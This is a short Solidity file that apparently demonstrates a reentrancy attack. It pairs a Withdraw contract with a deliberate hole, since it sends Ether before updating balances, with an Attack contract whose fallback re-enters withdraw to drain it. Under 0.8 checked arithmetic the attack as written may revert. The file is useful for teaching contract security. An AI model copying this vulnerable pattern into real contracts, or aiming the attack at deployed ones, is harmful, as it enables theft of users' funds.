//SPDX-License-Identifier:MIT
pragma solidity >0.8.0 <=0.9.0;

contract Withdraw {
    mapping(address => uint256) public balance;

    function deposit() external payable {
        balance[msg.sender] += msg.value;
    }

    // function withdraw() public {
    //     uint bal = balance[msg.sender];
    //     require(bal > 0);

    //     (bool sent, ) = msg.sender.call{value: bal}("");
    //     require(sent, "Failed to send Ether");

    //     balance[msg.sender] = 0;
    // }
    function withdraw(uint256 _amount) external {
        require(balance[msg.sender] >= _amount, 'Not Enough Balance');

        (bool sent, ) = msg.sender.call{value: _amount}('');
        require(sent, 'Failed to send Ether');
        balance[msg.sender] -= _amount;
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

contract Attack {
    Withdraw withdraw;

    constructor(address _address) {
        withdraw = Withdraw(_address);
    }

    fallback() external payable {
        if (address(withdraw).balance >= 1 ether) {
            // withdraw.withdraw();
            withdraw.withdraw(1 ether);
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether, 'Not Enough ether');
        withdraw.deposit{value: 1 ether}();
        // withdraw.withdraw();
        withdraw.withdraw(1 ether);
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
